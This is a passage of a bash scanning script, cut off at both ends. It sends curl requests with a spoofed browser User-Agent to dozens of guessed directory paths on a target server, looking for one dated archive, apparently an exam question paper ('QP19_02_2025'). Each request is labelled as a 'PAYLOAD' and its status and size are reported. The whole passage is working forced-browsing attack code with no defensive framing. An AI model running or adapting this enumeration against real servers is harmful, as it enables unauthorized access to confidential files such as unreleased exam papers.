" "${target}HandlingQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
